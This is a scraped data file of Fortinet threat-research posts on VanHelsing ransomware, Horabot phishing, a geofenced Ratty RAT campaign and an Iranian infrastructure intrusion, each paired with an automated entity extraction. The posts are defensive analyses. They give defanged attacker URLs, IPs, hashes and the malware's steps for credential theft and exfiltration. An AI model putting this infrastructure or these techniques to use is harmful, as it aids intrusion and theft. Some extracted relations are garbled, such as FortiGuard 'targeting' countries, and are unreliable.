.vanlocker .exe .dll .lnk .sys .msi .bat .bin .com .cmd .386 .adv .ani .cab .ico .mod .msstyles .msu .nomedia .ps1 .rtp .syss .deskthemepack .cur .cpl .diagcab .diagcfg .diagpke .dll .drv .hlp .pdb .hta .key .lock .ldf .ocx .icl .icns .ics .idx .mod .mpa .msc .msp .nls .rom .scr .shs .spl .theme .thempa .wpx The VanHelsing ransomware avoids encrypting files in the following folders: tmp wiint temp thumb $Recycle.Bin $RECYCLE.BIN System Volume Information boot Windows Trend Micro program files program files(x86) tor browser Windows intel all users msocache perflogs default microsoft It also creates the following mutex: It may also modify the registry key Software\\Classes\\.vanlocker\\DefaultIcon to use a custom icon for .VANLOCKER files. However, we did not observe this VanHelsing ransomware sample change the file icon of the encrypted files in our testing. It then drops the following ransom note in “README.txt”: The ransom note directs victims to chat sites operated by the attacker on TOR, where ransom negotiation takes place. The ransomware also replaces the desktop wallpaper with its own. The VanHelsing ransomware operates a TOR site where the group posts the information it has stolen from its victims. At the time of our initial investigation in late March 2025, six victims were on the data leak site, and they had added one more victim when we checked back in mid-April. Our analysis of the VanHelsing ransomware victims listed on the data leak site found: Note that victims who have paid the ransom may have been removed from the data leak site. As such, additional companies may have been affected by the VanHelsing ransomware. The VanHelsing ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. VanHelsing Ransomware File IOCs SHA2 Note 86d812544f8e250f1b52a4372aaab87565928d364471d115d669a8cc7ec50e17 VanHelsing ransomware Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Threat Research, Topic), (VanHelsing ransomware, Malware), (Windows, Platform), (Microsoft Windows, Platform), (SHA2, Hash), (99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98, Hash)\nRelationships: (FortiGuard Labs, publishes, Ransomware Roundup), (FortiGuard Labs, uses, SHA2), (VanHelsing ransomware, contains, Windows), (VanHelsing ransomware, executes, Windows), (VanHelsing ransomware, uses, SHA2), (VanHelsing ransomware, executedBy, Windows), (VanHelsing ransomware, encryptedFiles, Windows), (VanHelsing ransomware, addedExtension,.vanlocker), (VanHelsing ransomware, requiresRansom, Windows), (VanHelsing ransomware, dropsNotes, Windows), (VanHelsing ransomware, infectsVia, Windows), (VanHelsing ransomware, severityLevel, High), (VanHelsing ransomware, releasedOn, March 2025), (VanHelsing ransomware, communicatedWith, Windows), (VanHelsing ransomware, impactedParties, Windows",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Threat Research",
          "Topic"
        ],
        [
          "VanHelsing ransomware",
          "Malware"
        ],
        [
          "Windows",
          "Platform"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "SHA2",
          "Hash"
        ],
        [
          "99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98",
          "Hash"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "publishes",
          "Ransomware Roundup"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "SHA2"
        ],
        [
          "VanHelsing ransomware",
          "contains",
          "Windows"
        ],
        [
          "VanHelsing ransomware",
          "executes",
          "Windows"
        ],
        [
          "VanHelsing ransomware",
          "uses",
          "SHA2"
        ],
        [
          "VanHelsing ransomware",
          "executedBy",
          "Windows"
        ],
        [
          "VanHelsing ransomware",
          "encryptedFiles",
          "Windows"
        ],
        [
          "VanHelsing ransomware",
          "addedExtension",
          ".vanlocker"
        ],
        [
          "VanHelsing ransomware",
          "requiresRansom",
          "Windows"
        ],
        [
          "VanHelsing ransomware",
          "dropsNotes",
          "Windows"
        ],
        [
          "VanHelsing ransomware",
          "infectsVia",
          "Windows"
        ],
        [
          "VanHelsing ransomware",
          "severityLevel",
          "High"
        ],
        [
          "VanHelsing ransomware",
          "releasedOn",
          "March 2025"
        ],
        [
          "VanHelsing ransomware",
          "communicatedWith",
          "Windows"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 14
  },
  {
    "title": "Horabot Unleashed: A Stealthy Phishing Threat",
    "link": "https://www.fortinet.com/blog/threat-research/horabot-unleashed-a-stealthy-phishing-threat",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Collects victim’s sensitive informationSeverity Level:High In April, FortiGuard Labs observed a threat actor using phishing emails with malicious HTML files to spread Horabot, malware that primarily targets Spanish-speaking users. It is known for using crafted emails that impersonate invoices or financial documents to trick victims into opening malicious attachments and can steal email credentials, harvest contact lists, and install banking trojans. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Horabot leverages Outlook COM automation to send phishing messages from the victim’s mailbox, enabling it to propagate laterally within corporate or personal networks. The threat actor also executed a combination of VBScript, AutoIt, and PowerShell to conduct system reconnaissance, credential theft, and the installation of additional payloads. Based on the telemetry gathered by FortiGuard Labs, these attacks target users in Latin America, including Mexico, Guatemala, Colombia, Peru, Chile, and Argentina. To trick the recipient into opening the email and attachment, it is written in Spanish from a “legitimate” sender in Mexico, and its subject line references an attached invoice (Factura Adjunta). The message claims to include a PDF invoice for acquired services or products and urges the user to open the attachment. However, the attached ZIP file contains a malicious HTML file with Base64 encoded data in the “iframe” tag. This decoded data is also HTML data with a remote URL “hxxps://t4[.]contactswebaccion[.]store/0704/” used to download the next payload. The URL leads to a web page with JavaScript that immediately attempts to download the hard-coded ZIP file “ADJUNTOS_23042025.zip.” The file “ADJUNTOS_23042025.zip” contains an HTA file with a large number of unused strings in the <body>. The <script> tag uses “moveTo(7426, 6245),” a browser redirection trick that repositions the window. It then loads a script from “hxxps://d1[.]webcorreio[.]pics/LNIJGPNIPPK/WWGDI.” The script on the remote server injects an external VBScript hosted at “hxxps://dl[.]webcorreio[.]pics/g1/.” This VBScript is appended into the HTML <head> element, enabling stealthy execution within the user's browser context. The script serves to check the victim’s environment and deliver additional payloads. The VBScript at “hxxps://dl[.]webcorreio[.]pics/g1/” implements a custom string-decoded routine by processing every two characters, performing mathematical transformations, and reconstructing hidden strings, such as URLs, PowerShell commands, or other instructions. This method helps the malware evade static detection by keeping its real behavior hidden until execution. The following are the main tasks in this script, along with a screenshot of the decoded string: 1. Environment Detection and Evasion 2. Folder Preparation:It checks the working directory and if “C:\\Users\\Public\\LAPTOP-0QF0NEUP” does not exist, it creates it. Otherwise, it quits the script to avoid potential re-infection. 3. Collection and Exfiltration:This process collects the victim's basic information by grabbing the local IP address, computer name, username, and Windows version. It then sends the collected data via HTTP POST to “hxxps://d1[.]webcorreio[.]pics/g1/ctld/salvar.php.” 4. Preparation for AutoIt 5. Preparation for PowerShell:Creates a Batch script (.bat) to decode a text file (.tws) for executing a PowerShell script from “hxxps://labodeguitaup[.]space/a/08/150822/au/au.” This script is responsible for spreading phishing mail. 6. Persistence:First, it deletes all .lnk, .cmd, .bat, .exe, .vbs, and .tws files in the %Startup% and %AppData% folders. It then creates a new shortcut .lnk file pointing to the hidden dropped files related to the AutoIt payload (winupdate_version_686.exe with .ai arguments). It also sets the .lnk file to execute the Batch script during system startup for the PowerShell script. 7. Execution and Cleanup:It executes the created shortcuts via PowerShell commands using ExecutionPolicy Bypass to avoid script execution restrictions and kills mshta.exe. In the following sections, we’ll elaborate on the activities delivered by the encrypted data and the remote PowerShell. The AutoIt script “winupdate_version_067.ai” is for decryption. It finds the “.ia” file in the same directory, decrypts it with the hard-coded key “99521487,” injects the decrypted malicious DLL, and executes the entry point at “B080723_N.” The DLL begins by collecting system information from the victim’s machine, including the current date and time, operating system version, username, hostname, and installed antivirus software. It then sends this data via a POST request to the C2 server “hxxp://209[.]74[.]71[.]168/on7all/index15.php.” The exfiltrated data is organized into two parameters: AT, which carries information such as timestamp, OS type, and user identity, and MD, which specifically identifies the presence and name of antivirus software. This structured telemetry allows the attacker to profile infected systems. The malware then proceeds to steal browser-related data from a range of targeted web browsers, including Brave, Yandex, Epic Privacy Browser, Comodo Dragon, Cent Browser, Opera, Microsoft Edge, and Google Chrome. Once the data is collected, it is exfiltrated to the remote server at “hxxp://93[.]127[.]200[.]211/a/08/150822/au/logs/index.php?CHLG.” In addition to data theft, Horabot monitors the victim’s behavior and injects fake pop-up windows designed to capture sensitive user login credentials. These overlay windows are embedded within the RCData section of the decrypted malicious DLL, enabling stealthy deployment and execution without relying on external visual components. The target script on “hxxps://labodeguitaup[.]space/a/08/150822/au/au” in the previous VBScript intends to execute another six scripts at the remote server “hxxp://93[.]127[.]200[.]211/a/08/150822/au”: “app,” “a2,” “a3,” “a4,” “a5,” and “a6.” For unknown reasons, the “a5” file is empty, but the rest of the files can achieve a full cycle of building a victim list, email automation, and efficient Horabot payload delivery. The “app” acts as an infection check, checking whether a marker file (C:\\Users\\Public\\d240425) exists and exiting if it does. It then forcefully terminates any running instance of Outlook (Outlook.exe) to ensure it can launch Outlook cleanly using a COM object. Then, after creating an Outlook.Application object and accessing its MAPI namespace, it initializes an empty list to collect email addresses and defines a blocked domain list—“gmail,” “hotmail,” “outlook,” “edu,” “con.mx,” and “facebook”—which avoids collecting personal, academic, and Facebook-related emails. The “a2” script contains two functions to build a list of email addresses. The first function is designed to scan the contact data within Outlook’s AddressLists. For each contact, it checks the AddressEntryUserType to determine whether the email address can be directly retrieved or must be resolved via GetExchangeUser() to extract the primary SMTP address. The second function recursively traverses all folders in the Outlook mailbox structure, extracting and filtering email addresses from both recipients and senders of each message using the same logic. The “a3” script saves collected addresses in the “APPDATA\\Microsoft\\.Outlook” to reduce visibility and transmits the email list to an external server, “labodeguitaup[.]space.” It then fetches a payload from another server, “93[.]127[.]200[.]211,” and converts the response content to Base64 for later use. This routine indicates the malware is not only gathering target data but also preparing for future interactions or customized delivery stages. The “a4” script constructs and delivers malicious emails disguised as legitimate invoices. It saves the payload from server “93[.]127[.]200[.]211” with a “.PDF.html” filename and compresses it into a .zip archive that mimics a standard invoice attachment. It then prepares to send this archive as an attachment via Outlook. It references the extracted email address, excluding known domains like Gmail, Yahoo, Hotmail, .edu, Facebook, and .con.mx through the “Verificar-PalavrasBloqueadas” function (Check-BlockedWords). For each valid target, it creates an email item with a subject line referencing a “FWD Factura Adjunta” (FWD Invoice Attached), a Spanish-language body message about the attached invoice, and the malicious zip archive as an attachment. After the emails are sent, the script “a6” removes all traces and deletes related files, reducing the chances of being detected. Horabot is a growing threat demonstrating how phishing attacks are becoming more advanced, especially in Latin America. It spreads through fake Spanish-language emails pretending to be invoices, tricking people into opening harmful attachments. The malware uses VBScript, AutoIt, and PowerShell to hide itself, steal login credentials, and collect email contacts. It then uses Outlook to send itself to more victims, spreading through companies and personal networks. Because it is designed to blend in with normal Windows and Outlook behavior, it can be hard to notice. Organizations should block suspicious emails, watch for unknown file activity, and educate employees to be cautious with phishing scams. The malware described in this report are detected and blocked byFortiGuard Antivirusas: HTML/Phishing.683A!trHTML/Agent.9DFA!trAutoIt/Agent.HA!trBAT/Agent.PR!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. Domain t4[.]contactswebaccion[.]storef5[.]contactswebaccion[.]spacelabodeguitaup[.]space209[.]74[.]71[.]16893[.]127[.]200[.]211d1[.]webcorreio[.]picsupdatec[.]lat SHA256SCRIPT 523d7e9005b2e431068130989caf4a96062a029b50a5455d37a2b88e6d04f83d84d77737196ea5a8cb0efd8fc3ea61a878d1e1851cc63bcb1e0868019c71996f13a5c60a799c104a7bb1ff1489b82031c2ea1ed10712ca019e996fc0e37e9dfa2ba471519bed0a5503408fee0593bc13547c88cfb10872a9739c2b1eaa5a287ca885b89bb145dde56f6b63fcbf3560fb7179df43df5d212217ca583405beceb8 AUTOIT 25be06643204fc7386db3af84b200d362c3287b30c7491b666c4fe821a8c6eb45368f9f0994b28295aaf7d7af586d78827a95c6eb359a3921ebaa8d2fe1c98a9f7140c28921dcf9ac542965a37b5473432f39b34f00161b6f0c0f8af7c9551a5 BATCH 265a11951f6ac1fd1f150d2711e0158a59416dd709759b39904470f44c83272a370ccca7392282056f20b45829d0cac92acacfc07ab9699c54b3695649713854 Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Horabot, Malware), (VBScript, Tool), (AutoIt, Tool), (PowerShell, Tool), (Outlook COM Automation, TTP), (Latin America, Region), (Mexico, Country), (Guatemala, Country), (Colombia, Country), (Peru, Country), (Chile, Country), (Argentina, Country)\nRelationships: (FortiGuard Labs, publishes, 2025 Global Threat Landscape Report), (FortiGuard Labs, observes, threat actor), (FortiGuard Labs, collects, victim's sensitive information), (FortiGuard Labs, detects, Horabot), (FortiGuard Labs, identifies, threat actor), (FortiGuard Labs, targets, Latin America), (FortiGuard Labs, targets, Mexico), (FortiGuard Labs, targets, Guatemala), (FortiGuard Labs, targets, Colombia), (FortiGuard Labs, targets, Peru), (FortiGuard Labs, targets, Chile), (FortiGuard Labs, targets, Argentina)",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Horabot",
          "Malware"
        ],
        [
          "VBScript",
          "Tool"
        ],
        [
          "AutoIt",
          "Tool"
        ],
        [
          "PowerShell",
          "Tool"
        ],
        [
          "Outlook COM Automation",
          "TTP"
        ],
        [
          "Latin America",
          "Region"
        ],
        [
          "Mexico",
          "Country"
        ],
        [
          "Guatemala",
          "Country"
        ],
        [
          "Colombia",
          "Country"
        ],
        [
          "Peru",
          "Country"
        ],
        [
          "Chile",
          "Country"
        ],
        [
          "Argentina",
          "Country"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "publishes",
          "2025 Global Threat Landscape Report"
        ],
        [
          "FortiGuard Labs",
          "observes",
          "threat actor"
        ],
        [
          "FortiGuard Labs",
          "collects",
          "victim's sensitive information"
        ],
        [
          "FortiGuard Labs",
          "detects",
          "Horabot"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "threat actor"
        ],
        [
          "FortiGuard Labs",
          "targets",
          "Latin America"
        ],
        [
          "FortiGuard Labs",
          "targets",
          "Mexico"
        ],
        [
          "FortiGuard Labs",
          "targets",
          "Guatemala"
        ],
        [
          "FortiGuard Labs",
          "targets",
          "Colombia"
        ],
        [
          "FortiGuard Labs",
          "targets",
          "Peru"
        ],
        [
          "FortiGuard Labs",
          "targets",
          "Chile"
        ],
        [
          "FortiGuard Labs",
          "targets",
          "Argentina"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 12
  },
  {
    "title": "Multilayered Email Attack: How a PDF Invoice and Geo-Fencing Led to RAT Malware",
    "link": "https://www.fortinet.com/blog/threat-research/multilayered-email-attack-how-a-pdf-invoice-and-geofencing-led-to-rat-malware",
    "content": "FortiGuard Labs Threat Research Affected platforms:Windows (primarily), Linux & macOS (if Java is installed)Impacted parties:Users on systems with Java Runtime Environment (JRE) installedImpact:Grants remote access to attackers, enabling them to execute commands, log keystrokes, access files, activate webcam/microphone, and fully control the infected systemSeverity level:High The FortiMail IR team recently uncovered a new email campaign distributing a Remote Access Trojan (RAT) using multiple evasion techniques to target organizations in Spain, Italy, and Portugal. The campaign leverages theserviciodecorreoemail service provider, which is configured as an authorized sender for various domains and successfully passes SPF validation. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Additionally, it employs advanced evasion strategies, including the abuse of two file-sharing platforms, geolocation filtering, and Ngrok to create secure, obfuscated tunnels. These tactics further complicate detection and effectively mask the attack's true origin, ultimately facilitating the distribution of RATty malware. This campaign highlights the increasing sophistication of malware attack methodologies, leveraging the legitimate functionalities of remote administration tools for malicious purposes. The attacker exploits serviciodecorreo.es, a legitimate Spanish email service authorized to send emails on behalf of various domains. Since the SPF record for these domains designates serviciodecorreo.es as a valid sender, the malicious emails successfully pass SPF checks, creating the illusion of legitimacy. Consequently, these emails are more likely to bypass security filters, making it easier for them to be accepted by the recipient's mail server. This increases the likelihood of a successful attack, as the deceptive nature of the emails goes unnoticed. The sender attaches a PDF file asking the recipient to review two new invoices. This makes the recipient believe this email is important, which may influence them to check the attached files and details. This is basic social engineering to tempt the recipient into acting with less caution and under pressure. The attached PDF file displays a message indicating that the file is not being shown correctly and instructs the recipient to click a button to download the file locally. The button contains a Dropbox (file-sharing platform) link to download an HTML file named \"Fattura\" (Translation: “Invoice”). The choice of this file name plays into the social engineering tactic, aiming to persuade the recipient to click and view the information, ultimately leading to the delivery of a malicious payload. The HTML file contains a basic validation step with an \"I am not a robot\" prompt. After completing the verification, a simple HTML page is displayed with instructions to click a button to view the document. The button redirects the user to a link generated by Ngrok, a tunneling tool that allows users to expose local servers to the internet through secure, temporary URLs. The following URL abuses the MediaFire file-sharing platform by automatically downloading the JAR file (FA-43-03-2025.jar) when accessed. hxxps://download1528[.]mediafire[.]com/35ougpab4uhgHgb3Pmqh8niQ0hzS9b-TtTro5oPV5iUIULfNckqgXvjXQ6aTp-NF-k8EflSnFWC--Ffh4aX1NlYrzaPzgFlyxHVe0fKkLE1p3u5cntfU25orm92QdoQmXE9-gyI4hRgSYpaNcd3o12kJnPRbJhD3aqbl1Qx3vqbUtk8/ayp0ikmndrdseht/FA-43-03-2025.jar Using a legitimate file-sharing service helps attackers further evade detection, as security filters are less likely to flag downloads from trusted platforms. This tactic makes detection and blocking more difficult for security companies since automated analysis systems, sandbox environments, and security researchers often inspect URLs from locations outside the targeted region. By selectively delivering the malware only to specific geolocations, attackers reduce the risk of early detection and increase the likelihood of a successful attack. Below, we can see how this evasion leads to a Google Drive link containing a legitimate file: Ngrok is primarily used to test webhooks, develop locally hosted applications, and bypass NAT/firewall restrictions. However, as in this case, threat actors can misuse Ngrok to create dynamic, hard-to-detect phishing links that evade traditional security filters. Attackers use Ngrok to dynamically generate URLs that help them evade email security filtering mechanisms. One key technique they employ is geo-based cloaking, which serves different content depending on the user's location. In this case, when users access the Ngrok-generated URL from any country except Italy, they are redirected to a seemingly legitimate Google Drive document, making it harder for email security solutions to classify the URL as malicious. The attached fake invoice is identical for all targeted organizations. It is a purported invoice from the global health organization Medinova Health Group, and it has been designed to bypass most email security mechanisms. The seemingly legitimate invoice, shared via Google Drive, is unlikely to raise suspicion during email scanning and is intended to slip past email security engines without triggering any suspicion of malicious intent. However, when the request originates from Italy, the URL changes entirely, leading to downloading a malicious JAR file. Most email security systems perform email analysis from generic or cloud-based environments, not tied to a specific geographic location. As a result, when these systems access the embedded URL, they are redirected to a harmless decoy page rather than the malicious file. This geofencing technique ensures that only users in the targeted regions -in this case, Italy - can reach the actual malicious content. The .jar file contains a type ofRattymalware.  The file name, \"FA-43-03-2025.jar,\" resembles a neutral reference number. While such naming conventions are not unusual, this name was probably specifically chosen to prompt the end user to click and execute the file, assuming it is related to a payment document, thus encouraging hasty and careless action. Ratty RAT is a Java-based Remote Access Trojan (RAT) typically distributed as a .jar file. Since Java is a cross-platform language, Ratty RAT can run on various operating systems as long as the Java Runtime Environment (JRE) is installed. Threat actors use Ratty RAT to execute remote commands, log keystrokes, capture screenshots, and steal sensitive data, often as part of email-based social engineering campaigns with malicious attachments. While it is commonly delivered as a .jar file, attackers may also package it as an MSI (Microsoft Installer) file to increase its legitimacy and evade detection. By bundling the RAT inside an MSI, they can disguise it as legitimate software or an update, making it easier to trick users into executing the malware. What makes this email campaign particularly sophisticated is its combination of multiple tactics designed to evade detection and exploit trusted platforms. Its multi-layered strategy uses social engineering techniques to manipulate recipients into clicking on malicious links. The initial email, disguised as an invoice and sent from a sender who appears legitimate, serves as the entry point. The attacker clearly conducted prior research, identifying which domains allow the use of the specific email service for sending emails, thereby bypassing some critical security measures. The attackers also abuse file-sharing platforms like Dropbox and MediaFire to deliver their malicious payload while leveraging geolocation techniques to tailor the attack based on the recipient's location. Additionally, the use of Ngrok complicates detection by creating secure, obfuscated tunnels that mask the true origin of the attack. Together, these elements create a highly advanced and effective method of distributing malware, including RATty (Remote Access Trojan), which is challenging for traditional security systems to detect and block. Fortinet provides multiple layers of protection against this threat. FortiGate and FortiClient detect and block the malicious JAR file using the latest antivirus (AV) signatures. Customers are advised to ensure their systems are regularly updated with the most recent AV database.Fortinet customers are also already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services. FortiMail recognizes the phishing email as “virus detected,” and the FortiMail Content Disarm and Reconstruction (CDR) function automatically detects and mitigates this threat. In addition, FortiSandbox, embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions, provides real-time anti-phishing protection against known and unknown phishing attempts. Perception Point Email Security, now part of Fortinet FortiMail, also proactively detects and blocks emails containing malicious geo-fenced URLs used to deliver malware and phishing content and the RATty JAR file itself. This is achieved through advanced dynamic scanning and static analysis techniques. Combined, these detection capabilities ensure threats are mitigated during delivery, through malicious emails and links, and upon download, delivering end-to-end protection across the entire attack chain.In addition to technical defenses, organizations should adopt Security Awareness Training (SATs) programs and conduct regular phishing simulations. Fortinet’s freeNSE training:NSE 1 – Information Security Awarenessmodule on Internet threats is designed to help end users learn how to identify and protect themselves from phishing attacks.TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. By empowering users to recognize and respond to suspicious content, these initiatives significantly lower the risk of successful phishing or malware attacks.If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.You can alsosign upto receive future alerts to stay informed of new and emerging threats. IPs 143.47.53.106130.51.20.126199.232.214.172199.232.210.172 Domains: jw8ndw9ev[.]localto[.]netl5ugb6qxh[.]localto[.]net Hash (sha256): a1c2861a68b2a4d62b6fbfc7534f498cefe5f92f720466d24ae1b66ebc9f5731d20d14792c91107f53318ff7df83b9cd98acd3c394959a74e72278682822b6009184ff2cdd05fcaf111db23123479c845b2ece2fedccc2524b2de592f99808765f897fec78e2fd812eb3bc451222e64480a9d5bc97b746cc0468698a634708806153c80b17cb990caad1d80cac72c867d4ecfa1a84b7ab286b7373cd4168794e469b8911fd1ae2ded8532a50e9e66b8d54820c18ccdba49d7a38850d6af54475af8b6ac45918bc87d2a164fae888dab6e623327cba7c2409e4d0ef1dde8d1793 malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (Windows, Platform), (Linux & macOS, Platform), (Java, Tool), (users, Party), (system, Party), (Java Runtime Environment (JRE), Party), (attackers, Party), (command execution, Action), (keystroke logging, Action), (file access, Action), (webcam/microphone activation, Action), (remote control, Action), (high severity, Severity Level), (FortiMail IR team, Team), (Remote Access Trojan (RAT), Malware), (serviciodecorreoemail, Service Provider), (spf validation, Validation), (2025 Global Threat Landscape Report, Report), (advanced evasion strategies, Techniques), (two file-sharing platforms, Platforms), (geolocation filtering, Filtering), (Ngrok, Tool), (secure, State), (obfuscate, Action), (tunnel creation, Action), (malicious purposes, Purpose), (attacker, Attacker), (legitimate functionalities, Functionality), (malware attack methodologies, Methodology), (remote administration tools, Tool), (ratty malware, Malware)\nRelationships: (FortiGuard Labs Threat Research, affectedPlatforms, Windows), (FortiGuard Labs Threat Research, impactedParties, users), (FortiGuard Labs Threat Research, impact, grantsRemoteAccess), (FortiGuard Labs Threat Research, severityLevel, high), (Fort",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "Windows",
          "Platform"
        ],
        [
          "Linux & macOS",
          "Platform"
        ],
        [
          "Java",
          "Tool"
        ],
        [
          "users",
          "Party"
        ],
        [
          "system",
          "Party"
        ],
        [
          "attackers",
          "Party"
        ],
        [
          "command execution",
          "Action"
        ],
        [
          "keystroke logging",
          "Action"
        ],
        [
          "file access",
          "Action"
        ],
        [
          "webcam/microphone activation",
          "Action"
        ],
        [
          "remote control",
          "Action"
        ],
        [
          "high severity",
          "Severity Level"
        ],
        [
          "FortiMail IR team",
          "Team"
        ],
        [
          "serviciodecorreoemail",
          "Service Provider"
        ],
        [
          "spf validation",
          "Validation"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Report"
        ],
        [
          "advanced evasion strategies",
          "Techniques"
        ],
        [
          "two file-sharing platforms",
          "Platforms"
        ],
        [
          "geolocation filtering",
          "Filtering"
        ],
        [
          "Ngrok",
          "Tool"
        ],
        [
          "secure",
          "State"
        ],
        [
          "obfuscate",
          "Action"
        ],
        [
          "tunnel creation",
          "Action"
        ],
        [
          "malicious purposes",
          "Purpose"
        ],
        [
          "attacker",
          "Attacker"
        ],
        [
          "legitimate functionalities",
          "Functionality"
        ],
        [
          "malware attack methodologies",
          "Methodology"
        ],
        [
          "remote administration tools",
          "Tool"
        ],
        [
          "ratty malware",
          "Malware"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "affectedPlatforms",
          "Windows"
        ],
        [
          "FortiGuard Labs Threat Research",
          "impactedParties",
          "users"
        ],
        [
          "FortiGuard Labs Threat Research",
          "impact",
          "grantsRemoteAccess"
        ],
        [
          "FortiGuard Labs Threat Research",
          "severityLevel",
          "high"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 30,
    "relationship_count": 4
  },
  {
    "title": "FortiGuard Incident Response Team Detects Intrusion into Middle East Critical National Infrastructure",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-incident-response-team-detects-intrusion-into-middle-east-critical-national-infrastructure",
    "content": "FortiGuard Labs Threat Research The FortiGuard Incident Response (FGIR) team recently investigated a long-term cyber intrusion targeting critical national infrastructure (CNI) in the Middle East, attributed to an Iranian state-sponsored threat group. The attack involved extensive espionage operations and suspected network prepositioning—a tactic often used to maintain persistent access for future strategic advantage. Full Report Available:The following article provides key findings, but a full report of this activity is availablehere. The report includes an analysis of novel malware deployed throughout the intrusion, a detailed breakdown of adversary TTPs across different attack stages, Indicators of Compromise (IOCs) to assist defenders, and attribution considerations for deeper insight. The intrusion persisted from at least May 2023 to February 2025, with signs of compromise dating back as far as May 2021. Attackers initially gained access via stolen VPN credentials and established persistence through multiple web shells and backdoors, including Havoc, HanifNet, HXLibrary, and NeoExpressRAT. They bypassed network segmentation using open-source proxying tools like plink, Ngrok, glider proxy, and ReverseSocks5. Key insights from the investigation include: The attack unfolded in four distinct phases: 1. Establishing a Foothold and Initial Operations (May 2023 – April 2024)The adversary used stolen credentials to access the victim’s SSL VPN, deploying web shells on public-facing servers and installing Havoc, 